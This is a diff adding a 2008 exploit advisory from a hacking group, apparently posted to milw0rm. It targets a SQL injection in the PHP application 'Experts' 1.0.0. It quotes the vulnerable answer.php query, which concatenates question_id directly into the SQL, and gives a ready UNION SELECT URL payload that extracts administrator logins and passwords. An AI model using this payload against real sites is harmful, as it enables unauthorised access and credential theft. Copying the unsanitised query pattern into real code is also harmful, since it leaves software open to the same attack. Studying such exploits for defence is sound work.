@@ -1,0 +1,55 @@
+=========================================================
+ Experts (answer.php) Remote SQL Injection Vulnerability
+=========================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 10 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : Experts
+ VERSION     : 1.0.0
+ DOWNLOAD    : http://downloads.sourceforge.net/experts
+#####################################################
+
+---SQL Injection Exploit---
+
+***magic_quotes_gpc = off***
+
+##################################################################################
+Line:
+   67:	$con= "SELECT question_text, question_expert, question_category, question_closed,  
+   68:	TIME_TO_SEC(TIMEDIFF(NOW(),question_date)) AS seconds_ago, 
+   69:	user_login, user_id, category_name, expert_login   
+   70:	FROM question 
+   71:	INNER JOIN (user,category, expert) 
+   72:	ON (question_user=user_id 
+   73:	AND question_category=category_id AND question_expert=expert_id ) 
+   74:	WHERE question_id=".$question_id;
+   75:	//echo $con."<br>";
+   76:	$fai_con=mysql_query($con) or die(mysql_error());
+##################################################################################
+
+EXPLOIT:
+
+http://[Target]/[experts_path]/answer.php?question_id=41 AND 1=2 UNION SELECT concat(administrator_login,0x3a,administrator_password),2,3,4,5,6,7,8,9 FROM administrator
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-10]
